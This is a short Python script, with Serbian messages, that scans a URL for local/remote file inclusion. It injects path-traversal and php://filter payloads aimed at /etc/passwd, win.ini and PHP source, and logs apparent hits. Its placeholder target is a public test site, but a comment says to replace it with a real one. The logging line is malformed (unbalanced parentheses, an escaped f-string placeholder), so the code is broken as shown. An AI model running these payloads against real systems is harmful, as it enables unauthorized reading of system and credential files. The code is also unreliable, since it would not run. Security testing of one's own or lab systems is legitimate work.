import requests
from utils.log_utils import log_to_sheet, classify_severity

LFI_PAYLOADS = [
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php"
]

def test_lfi_rfi(url):
    try:
        for payload in LFI_PAYLOADS:
            full_url = f"{url}?file={payload}"
            print(f"[+] Testiram LFI/RFI: {full_url}")
            res = requests.get(full_url, timeout=5)
            if "root:x" in res.text or "[extensions]" in res.text or "base64" in res.text:
                print(f"[!] Mogući LFI/RFI: {full_url}")
                severity = classify_severity(f"LFI/RFI: {full_url}")
                log_to_sheet(__file__, f"LFI/RFI: {full_url}") + f' | Severity: {{severity}}')
    except Exception as e:
        print(f"[-] Greška: {e}")

def run_lfi_rfi():
    print("[~] Pokrećem LFI/RFI test...")
    targets = [
        "http://testphp.vulnweb.com",  # zameni sa realnim
    ]
    for t in targets:
        test_lfi_rfi(t)

if __name__ == "__main__":
    run_lfi_rfi()
